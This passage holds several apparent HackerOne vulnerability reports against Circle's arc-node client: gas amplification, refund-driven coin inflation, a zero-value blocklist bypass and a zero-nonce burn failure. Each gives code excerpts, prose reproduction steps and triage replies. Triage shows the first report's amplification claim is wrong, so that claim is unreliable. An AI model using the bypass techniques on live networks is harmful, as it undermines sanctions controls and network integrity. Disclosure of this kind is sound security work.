if !gas.record_cost(gas_used) { 
    gas.spend_all(); // <--- CRITICAL VULNERABILITY 
} 
``` 
If `gas_used` (actual work) is 10,000,000 but the parent budget was only 100,000, the handler simply spends the 100,000. The remaining 9,900,000 gas worth of CPU cycles is **donated by the validator for free**. 
2. ### Amplification at Scale 
By batching calls through `Multicall3From` or utilizing deep subcall trees, an attacker can create blocks that the consensus layer believes contain 30M gas of transactions, but which actually contain **3,000M (3 Gigagas)** of physical compute. No standard validator hardware can verify such a block within the target block time. 
## Proof of Concept 
1.  **Deployment**: Deploy a "Burner" contract with a loop that performs 1,000 `KECCAK256` hashes per call. 
2.  **Transaction**: Send a transaction to `Memo.memo` with a total `gas_limit` of 250,000. 
3.  **The Craft**: 
    *   Initialize the `CallFrom` subcall with a high child gas target. 
    *   The child executes 5,000,000 gas worth of hashes. 
4.  **Observation**:  
    *   The transaction receipt shows `gas_used = 250,000`. 
    *   The validator CPU profile shows 20x higher processing time than a normal 250k gas transaction. 
## CVSS 4.0 Assessment 
**Severity**: 9.3 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:H/SI:N/SA:H` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The vulnerability is exploitable by any user with access to a public RPC endpoint by submitting a standard transaction. 
- **Attack Complexity: Low (AC:L)**: Exploitation does not require specialized knowledge of the block timing or validator internal state. A simple crafted transaction is sufficient. 
- **Attack Requirements: None (AT:N)**: There are no specific environmental requirements or conditions (like a specific gas price or validator count) needed to execute the attack. 
- **Privileges Required: None (PR:N)**: No special roles or permissions are required to call the `Memo` or `Multicall3From` contracts which bridge to the vulnerable logic. 
- **User Interaction: None (UI:N)**: The attack is completely autonomous and requires no victim interaction. 
- **Impact on Vulnerable System (VC:N, VI:N, VA:H)**: 
    - **Availability (VA:H)**: Critical. The exploit allows an attacker to fill the network's processing pipeline with "unbilled" work, leading to a total loss of service as nodes fail to process blocks within the consensus timeout. 
- **Impact on Subsequent Systems (SC:H/SA:H)**: 
    - **Subsequent Availability (SA:H)**: Since the Execution Layer (Vulnerable System) is the engine for the entire Arc Chain (Subsequent System), a halt in execution effectively halts all downstream services, bridges, and cross-chain communications. 
## Weakness Classification 
- **CWE-400**: Uncontrolled Resource Consumption (Resource Amplification) 
- **CWE-1339**: Insufficient Precision or Accuracy of a Resource Metering Mechanism 
## References 
- **Vulnerable Completion Handler**: [`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs) (Refer to Line 998) 
- **Subcall Precompile Framework**: [`crates/precompiles/src/call_from.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/call_from.rs) 
## Impact 
- **Network Death**: Blocks become too expensive to process, causing validators to lag, timing out consensus rounds, and halting the chain. 
- **Block Limit Bypass**: The economic bound of the network is broken. Gas is no longer a scarce resource for attackers. 
- **Node Desynchronization**: Slower full nodes will fall behind permanently, reducing network security and diversity. 
Timeline: 
2026-04-15 12:34:28 +0000: @hackerone-agent (comment) 
Hello @inkerton, 
Thank you for your submission! 
Your report has passed the preliminary review. Please note that this does not confirm validation, the status may change after further review. 
Next in the workflow is for our team to validate and reproduce the issue, evaluating its accuracy and security impact. You will be notified when the team has reviewed and made an assessment on your report. 
We'll keep you updated as the process moves forward. Have a great day! 
Thanks, 
hackerone-agent 
--- 
2026-04-15 13:41:00 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 13:41:15 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 18:15:12 +0000: @h1_analyst_leevi (bug not applicable) 
Hi, 
Thank you for your submission. 
The core claim of this report is that a child frame spawned by CallFrom can execute with more gas than the parent allocated, creating unbilled computation. This is incorrect based on the actual code. In `call_from.rs` (lines 103-106), the child's gas limit is explicitly derived from the parent's gas budget: the ABI decoding overhead is subtracted first, then EIP-150 63/64ths forwarding is applied (`child_gas_limit = available - (available / 64)`). The child can never receive more gas than the parent provided. 
The `gas.spend_all()` call at `evm.rs:998` that the report identifies as the vulnerability is a standard fallback inside `record_cost`. It operates on a `Gas` struct initialized with `continuation.gas_limit`, which is the parent's own gas allocation for the precompile call (stored at line 872). When a child halts (OOG, stack underflow, etc.), line 982 sets `gas_used = continuation.gas_limit`, meaning the entire parent allocation is consumed, and `record_cost` succeeds normally. The `spend_all()` branch is only reached if `gas_used` somehow exceeded `gas_limit`, in which case it caps at `gas_limit`, not at some smaller value. In no scenario does the validator perform computation that exceeds the parent's gas budget, because the child's gas limit is physically constrained to be less than the parent's allocation before execution begins. 
The scenario described in the Proof of Concept, where a 250,000 gas transaction causes 5,000,000 gas worth of hashes, is not possible. The child frame would receive at most ~245,000 gas (after overhead and 63/64ths), would hit OOG at that limit, and the full 250,000 would be charged. There is no amplification vector. Additionally, the PoC lacks a working script, local testnet environment, and step-by-step reproduction instructions with observed vs. expected output. 
This issue does not qualify under the program's current scope and rules, so we are closing this report. 
Thanks, 
H1 Triage 
---" , "Title:         Critical Native Coin Inflation via Misaligned Gas Refund Accounting in EVM Handler 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Incorrect Calculation 
Severity:      Critical (9.9) 
Link:          https://hackerone.com/reports/3676328 
Date:          2026-04-15 21:26:45 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network uses a custom implementation for execution logic and block fee calculations, specifically within `ArcEvmHandler::reward_beneficiary`. This function redirects the EIP-1559 base fee (which is typically burned) directly to the network validator.  
However, the calculation of the validator reward strictly uses raw consumed gas (`gas.used()`), failing to subtract the transaction's gas refunds (e.g., from `SSTORE` clearing). Because the transaction sender is properly refunded by the underlying `revm` engine at the end of the transaction, but the validator is credited for the *unrefunded* amount, **Native Coins are printed out of thin air.**  
This allows an attacker to trigger massive unbacked inflation, completely compromising the network's economic invariants and bypassing the `NativeCoinAuthority` totalSupply guarantees. 
## Vulnerability Details 
EVM's gas model features dynamic refunds (e.g., clearing a non-zero storage slot to zero refunds 4,800 gas). In standard Ethereum execution, the transaction sender is explicitly refunded this amount (capped at 20% of gas used per EIP-3529) at the end of the transaction. 
In `arc-node`, the `ArcEvmHandler` overrides the standard `revm` `reward_beneficiary` function to re-route what would normally be the burned base fee directly to the validator: 
```rust 
// File: crates/evm/src/handler.rs 
    #[inline] 
    fn reward_beneficiary( 
        &self, 
        evm: &mut Self::Evm, 
        exec_result: &mut <<Self::Evm as EvmTr>::Frame as FrameTr>::FrameResult, 
    ) -> Result<(), Self::Error> { 
        let ctx = evm.ctx(); 
        let beneficiary = ctx.block().beneficiary(); 
        // ... Snip ... 
        let effective_gas_price = ctx.tx().effective_gas_price(basefee); 
         
        let gas_used = exec_result.gas().used(); // <--- Fails to subtract refunds! 
        let total_fee_amount = U256::from(effective_gas_price) * U256::from(gas_used); 
        // Transfer the total fee to the beneficiary 
        evm.ctx_mut() 
            .journal_mut() 
            .balance_incr(beneficiary, total_fee_amount) 
            .map_err(From::from) 
    } 
``` 
In the `revm` engine version used by `arc-node`, `gas.used()` (or `gas.spent()`) represents the absolute raw gas consumed by EVM opcodes and intrinsic costs *before* refunds are applied. Standard EVM execution (and `revm`'s native implementation of `reward_beneficiary`) mathematically prevents inflation by manually deducting the capped refund: 
```rust 
// Standard revm implementation in mainnet post_execution 
let reward = (effective_gas_price - basefee) * U256::from(gas.spent() - gas.refunded() as u64); 
``` 
Because `ArcEvmHandler` omits `- gas.refunded()`, the accounting diverges and breaks the fundamental asset balance: 
1. **Sender Pays**: `(gas.used() - capped_refund) * effective_gas_price` (calculated and refunded securely by `revm`'s default `mainnet` fallback handler). 
2. **Validator Receives**: `gas.used() * effective_gas_price`. 
3. **Net System Effect**: A surplus of `capped_refund * effective_gas_price` is minted entirely out of thin air. 
## Proof of Concept 
To reproduce the economic inflation leak: 
1. **Setup**: An attacker submits a transaction to a smart contract that clears 100 heavily padded storage slots (non-zero to zero). 
2. **Gas Metrics**: The transaction gas limit is `1,000,000` with `gas_price` at `10 gwei`. 
3. **Execution**: The execution overhead and resets consume exactly `100,000` gas. The `SSTORE` opcode triggers `20,000` in gas refunds. 
4. **Sender Refund Loop**: The underlying `revm` mainnet `post_execution` routine refunds the attacker's balance with the unused gas AND the refunded gas. The attacker is billed for only `80,000` gas (`800,000 gwei`). 
5. **Validator Reward Loop**: `ArcEvmHandler::reward_beneficiary` executes and incorrectly evaluates `exec_result.gas().used()` returning the raw `100,000`. 
6. **Desync Result**: The validator is credited `1,000,000 gwei` while the sender was only charged `800,000 gwei`. Exactly `200,000 gwei` of unbacked Native Coin has been minted from nowhere. If the attacker operates the validator or colludes with one, they can syphon infinite Native Coin. 
## Recommended Mitigation 
Update `reward_beneficiary` to subtract the applied capped refund from the total gas used before computing the validator's reward.  
**Note**: To accurately conform to `revm`'s `post_execution` logic (which caps refunds via EIP-3529 to a maximum of 1/5th the gas used), you must align the refund calculation precisely: 
```diff 
-   let gas_used = exec_result.gas().used(); 
+   // Compute the capped refund according to EIP-3529 (max 1/5th of used gas) 
+   let max_refund = exec_result.gas().used() / 5; 
+   let applied_refund = std::cmp::min(exec_result.gas().refunded() as u64, max_refund); 
+   let billable_gas = exec_result.gas().used() - applied_refund; 
-   let total_fee_amount = U256::from(effective_gas_price) * U256::from(gas_used); 
+   let total_fee_amount = U256::from(effective_gas_price) * U256::from(billable_gas); 
``` 
## CVSS Assessment 
**CVSS v4.0 Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` 
**Base Score**: 9.9 (Critical) 
**Weakness**: CWE-682: Incorrect Calculation / CWE-311: Missing Economic Constraint 
### Metric Justification 
- **Attack Vector (AV:N)**: Exploit is executed over the network by sending a standard EVM transaction. 
- **Attack Complexity (AC:L)**: Requires no special setup; any transaction triggering `SSTORE` refunds inadvertently inflates the coin. 
- **Privileges Required (PR:N)**: No special node, whitelisting, or administrative privileges are needed. An unprivileged EOA triggers it. 
- **Integrity (VI:H, SI:H)**: Complete breakage of the network's financial invariants via unbacked inflation, corrupting the native token ecosystem state. 
- **Confidentiality (VC:H, SC:H)**: Absolute loss of protocol sovereignty over token reserves. 
## References 
1. EIP-3529: Reduction in refunds (https://eips.ethereum.org/EIPS/eip-3529) 
2. `arc-node` `crates/evm/src/handler.rs` implementation. 
## Impact 
The Arc network's `native_coin_authority` explicitly attempts to regulate and restrict the minting of Native Fiat Tokens to maintain 1:1 backing with fiat reserves. 
This vulnerability silently bypasses the Mint protocol and creates counterfeit Native Coins proportional to refunded EVM storage operations. An attacker can deploy a smart contract that maximizes `SSTORE` refunds (up to the 20% block limit), creating a permanent, sustainable, and uncapped inflation loop. 
Timeline: 
2026-04-15 21:36:42 +0000: @hackerone-agent (comment) 
Hello @inkerton, 
Thank you for your submission! 
Your report has passed the preliminary review. Please note that this does not confirm validation, the status may change after further review. 
Next in the workflow is for our team to validate and reproduce the issue, evaluating its accuracy and security impact. You will be notified when the team has reviewed and made an assessment on your report. 
We'll keep you updated as the process moves forward. Have a great day! 
Thanks, 
hackerone-agent 
--- 
" , "Title:         Total Quarantine Failure via Zero-Value Compliance Bypass 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Improper Access Control - Generic 
Severity:      Critical (9.3) 
Link:          https://hackerone.com/reports/3676320 
Date:          2026-04-15 21:18:26 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network's address quarantine system (blocklist) is critically flawed due to an inconsistency in how the node's execution engine and mempool handle zero-value transactions. Both the `ArcEvm` handler and the `ArcTransactionValidator` explicitly skip blocklist validation for recipients when the native `amount` (msg.value) is zero. This allows users to interact with blocklisted or sanctioned smart contracts at will, effectively bypassing the network's foundational compliance promises. 
## Vulnerability Details 
The vulnerability exists in two critical locations: 
1. ### EVM Execution Layer (`crates/evm/src/evm.rs`) 
In the `before_frame_init` hook, which is responsible for enforcing blocklist restrictions before code execution begins, the logic only triggers the `check_blocklist_and_create_log` helper if the transfer `amount` is non-zero: 
```rust 
// crates/evm/src/evm.rs:L505-509 
match transfer_params { 
    Some((from, to, amount)) if !amount.is_zero() => { 
        self.check_blocklist_and_create_log(from, to, amount, frame_input) 
    } 
    _ => Ok(BeforeFrameInitResult::None), 
} 
``` 
If a user calls a blocklisted contract with `value = 0`, the blocklist check is bypassed entirely. The transaction proceeds to execute the target's bytecode, allowing interaction with sanctioned protocols. 
2. ### Mempool Validation Layer (`crates/execution-txpool/src/validator.rs`) 
The transaction pool's validator duplicates this flaw. It unconditionally checks the transaction sender but only filters the recipient (`transaction.to()`) if the transaction bears native value: 
```rust 
// crates/execution-txpool/src/validator.rs:L325-327 
let has_value = !transaction.value().is_zero(); 
let addresses = 
    std::iter::once(transaction.sender()).chain(transaction.to().filter(|_| has_value)); 
``` 
Because restricted recipients are filtered out when `has_value` is false, zero-value transactions targeting sanctioned contracts are accepted into the mempool and included in blocks. 
## Proof of Concept 
### Reproduction Steps 
1. Identify an address `A` (a Smart Contract) that is currently blocklisted via `NativeCoinControl`. 
2. As a non-blocklisted User `B`, attempt to send a transaction to Address `A` with `value = 1 wei`. Observe the transaction is rejected by the mempool/EVM with "blocked address". 
3. Attempt the same call to Address `A` with `value = 0`. Observe that the transaction is accepted, included in a block, and the code at Address `A` executes successfully. 
4. Verify that User `B` can interact with non-native assets (e.g., calling `ERC20.transfer` or invoking protocol state changes) despite the quarantine on the contract. 
## CVSS 4.0 Assessment 
**Score**: 9.3 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N` 
### Metric Justification 
- **Attack Vector: Network (AV:N)**: The exploit is triggered by submitting a network transaction remotely. 
- **Attack Complexity: Low (AC:L)**: The exploit requires absolutely no specialized tooling. The attacker just sends a 0-value transaction to the blocked contract. 
- **Attack Requirements: None (AT:N)**: No special conditions are needed beyond network access. 
- **Privileges Required: None (PR:N)**: Can be performed by any active, unprivileged user. 
- **User Interaction: None (UI:N)**: No victim interaction. 
- **Vulnerable System Impact - Integrity (VI:H)**: Complete bypass of the authorization checks meant to block interaction with a designated address. Total loss of isolation guarantees. 
- **Subsequent System Impact (SC:H, SI:H)**: Extreme regulatory impact on the governing organization (Circle) and compliance systems that believe interactions with this address have been halted. Downstream monitoring apps are bypassed. 
## Weakness Classification 
- **CWE-284**: Improper Access Control 
- **CWE-863**: Incorrect Authorization 
- **CWE-1025**: Comparison Using Wrong Factors (Checking value size to imply compliance risk). 
## Suggested Mitigation 
Update both the `ArcEvm` handler and the `ArcTransactionValidator` to check the blocklist status of the recipient (target address) *regardless* of the native value being transferred. The quarantine must block execution entirely. 
### Proposed Fix (`crates/evm/src/evm.rs`): 
```diff 
- match transfer_params { 
-     Some((from, to, amount)) if !amount.is_zero() => { 
-         self.check_blocklist_and_create_log(from, to, amount, frame_input) 
-     } 
-     _ => Ok(BeforeFrameInitResult::None), 
- } 
+ if let Some((from, to, amount)) = transfer_params { 
+     self.check_blocklist_and_create_log(from, to, amount, frame_input) 
+ } else { 
+     // Fallback for calls that have no value transfer but still touch a target 
+     if let FrameInput::Call(ref inputs) = frame_input.frame_input { 
+         if self.hardfork_flags.is_active(ArcHardfork::Zero5) { 
+             // Check both addresses explicitly against blocklist 
+             let from_blocklisted = self.is_address_blocklisted(inputs.caller, ...)?; 
+             let to_blocklisted = self.is_address_blocklisted(inputs.target_address, ...)?; 
+             // ... Revert appropriately ... 
+         } 
+     } 
+ } 
``` 
### Proposed Fix (`crates/execution-txpool/src/validator.rs`): 
```diff 
- let has_value = !transaction.value().is_zero(); 
- let addresses = 
-     std::iter::once(transaction.sender()).chain(transaction.to().filter(|_| has_value)); 
+ let addresses = std::iter::once(transaction.sender()).chain(transaction.to()); 
``` 
## References 
- **Vulnerable Handler**: [`crates/evm/src/evm.rs:L505-509`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L505-L509) 
- **Vulnerable Validator**: [`crates/execution-txpool/src/validator.rs:L325-327`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/execution-txpool/src/validator.rs#L325-L327) 
## Impact 
- **Total Compliance Failure**: Sanctioned smart contracts (e.g., mixers, illegal protocols) remain fully functional for the entire network. Users can deposit non-native assets (ERC-20s) or execute sensitive logic on blocklisted contracts without restriction. 
- **Regulatory Integrity Collapse**: The "Digital Quarantine" advertised as a core feature of the Arc Network is technically non-existent for non-native assets, as the primary gatekeeper (the blocklist) is bypassed by simply omitting the native coin transfer. 
- **Systemic Risk**: Malicious contracts that are identified and blocklisted to prevent further damage can still be exploited or utilized by users, as long as they don't send native `value`. 
Timeline: 
2026-04-16 07:56:37 +0000: @h1_analyst_dante (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3659114. Both reports describe a blocklist bypass vulnerability where zero-value transactions allow blocklisted addresses to evade quarantine restrictions. 
The key similarities include: the identical root cause where blocklist checks are conditionally skipped when msg.value is zero, the same vulnerable code locations in `crates/evm/src/evm.rs` and `crates/execution-txpool/src/validator.rs`, and the same exploitation method enabling blocklisted addresses to perform ERC-20 operations and contract interactions without native coin transfers. 
Report #3659114 was submitted earlier and has already been evaluated as the canonical report for this vulnerability. 
Thanks, 
@h1_analyst_dante 
--- 
" , "Title:         Compliant Burn Blocked for Zero-Nonce Sanctioned Wallets 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Incorrect Calculation 
Severity:      Critical (9.2) 
Link:          https://hackerone.com/reports/3678126 
Date:          2026-04-16 14:35:15 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Circle Arc Network utilizes a custom `check_can_decr_account` helper within its `NativeCoinAuthority` framework to safely ensure account decrements do not orphan or maliciously empty storage slots. This decrement logic is used centrally by the `burn` function to seize assets from sanctioned addresses. 
However, a critical logic constraint explicitly reverts the execution if a native coin decrement function clears the remaining balance of an account which happens to be empty (having `nonce == 0` and uninitialized code hash).  
If a malicious entity or a heavily sanctioned decentralized application directs illicit incoming transfers to newly generated "Zero-Nonce" wallet addresses in order to hold funds, the Circle Native Coin Authority loses the ability to execute its compliant `burn` routine across these wallets entirely. The burn reverts, leaving the sanctioned funds completely irrecoverable by the compliance team but perfectly intact for the underlying wallet. 
## Vulnerability Details 
When `NativeCoinAuthority::burnCall` triggers the underlying `balance_decr()`, the balance state is evaluated using `arc-node/crates/precompiles/src/helpers.rs::check_can_decr_account`: 
**Source**: `crates/precompiles/src/helpers.rs:434-456` 
```rust 
pub(crate) fn check_can_decr_account(...) -> Result<(), PrecompileErrorOrRevert> { 
    // Check that the account has sufficient balance 
    let from_account_balance = loaded_account_info.balance.checked_sub(amount)...; 
    // Check that the account would not be emptied if this transfer goes through 
    let from_account_is_empty = from_account_balance.is_zero() 
        && loaded_account_info.nonce == 0 
        && (loaded_account_info.code_hash() == KECCAK_EMPTY 
            || loaded_account_info.code_hash().is_zero()); 
    // VULNERABILITY: This condition fails to distinguish between a regular user 
    // and the privileged NativeCoinAuthority. 
    if from_account_is_empty { 
        return Err(PrecompileErrorOrRevert::new_reverted( 
            *gas_counter, 
            ERR_CLEAR_EMPTY, // "Cannot clear empty account" 
        )); 
    } 
    // ... 
} 
``` 
While this check is historically used to prevent clearing uninitialized accounts, its application to the **Authority's burn function** is a critical failure. If a sanctioned entity has received funds but has not yet sent a transaction (maintaining a nonce of 0), the Authority is technically prohibited from burning those funds to comply with law enforcement orders. 
## Proof of Concept 
To fully reproduce this logic deadlock, follow the execution trace mapping: 
1. **Preparation**: A sanctioned entity wants to shield 1,000 Native Tokens from regulatory seizure, so they simply transfer the assets to a newly generated EOA: Address `0xZ`. The `nonce` natively stays at `0` unless it initiates an outgoing tx. 
2. **Authority Action**: Circle Compliance OFAC monitoring blocklists Address `0xZ` and authorized Admins call `NativeCoinAuthority.burn(0xZ, 1000)`. 
3. **Execution Trace Part 1**: The node hits `native_coin_authority.rs:374-375`: 
   ```rust 
   // Check balance and burn tokens 
   balance_decr(&mut precompile_input.internals, args.from, args.amount, &mut gas_counter)?; 
   ``` 
4. **Execution Trace Part 2 & The Revert**: The EVM handler passes the burn intent to `helpers.rs`. Inside `check_can_decr_account`, the system calculates `1000 - 1000 = 0`. Because the remaining balance is `0`, AND the account `nonce == 0`, AND the codehash is empty, `from_account_is_empty` evaluates to `true`. 
5. **Resolution**: The underlying `helpers.rs` forcibly returns `Revert(ERR_CLEAR_EMPTY)`. The transaction fails on-chain. The tokens remain perfectly intact and permanently shielded inside the sanctioned wallet, neutralizing Circle's legal enforcement. 
## Recommended Remediation 
Implement an explicit bypass within `balance_decr` and `check_can_decr_account` exclusively for `burn` actions orchestrated by the `NativeCoinAuthority`. If the operation is an authority `burn`, safely execute the trie clearing or tolerate the empty account deletion without triggering `ERR_CLEAR_EMPTY`. 
```rust 
// Proposed Fix in helpers.rs 
fn check_can_decr_account(account: &AccountInfo, amount: U256, is_authority_burn: bool) -> Result<(), ...> { 
    // ... 
    if new_balance.is_zero() && account.nonce == 0 && !is_authority_burn { 
        return Err(...); 
    } 
    // ... 
} 
``` 
## CVSS 4.0 Assessment 
**Severity**: 9.2 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:H/SI:N/SA:N` 
**Weakness**: CWE-682 (Incorrect Calculation) / CWE-840 (Business Logic Error) 
### Metric Justification 
- **Attack Vector (AV:N)**: An attacker exploits this remotely by simply interacting with addresses on the network. 
- **Attack Complexity (AC:L)**: The exploit happens passively; the sanctioned entity merely has to keep their funds in a fresh wallet. 
- **Privileges Required (PR:N)**: The mechanism blocking the burn is triggered strictly by the natural state (`nonce=0`) of an unprivileged user's wallet. 
- **Integrity (VI:H)**: Complete bypass of Circle `burn` capabilities.  
- **Subsequent System (SC:H)**: Regulatory non-compliance impacts the overarching Fiat management logic. Failure to execute a mandatory burn directly violates external legal and compliance guarantees. 
## Impact 
- **Regulatory Non-Compliance**: Circle becomes technically and mathematically incapable of fulfilling "Seize and Burn" orders for sanctioned assets held in newly created wallets. 
- **Protocol Limitation**: The `NativeCoinAuthority` loses its "God Mode" regulatory guarantee over the native coin supply. 
- **Attacker Advantage**: A malicious actor aware of this flaw can "park" sanctioned funds in multiple fresh wallets, permanently immunizing them from Circle's central burn mechanic. 
Timeline: 
2026-04-16 14:50:35 +0000: @hackerone-agent (comment) 
Hello @inkerton, 
Thank you for your submission! 
Your report has passed the preliminary review. Please note that this does not confirm validation, the status may change after further review. 
Next in the workflow is for our team to validate and reproduce the issue, evaluating its accuracy and security impact. You will be notified when the team has reviewed and made an assessment on your report. 
We'll keep you updated as the process moves forward. Have a great day! 
Thanks, 
hackerone-agent 
--- 
"]
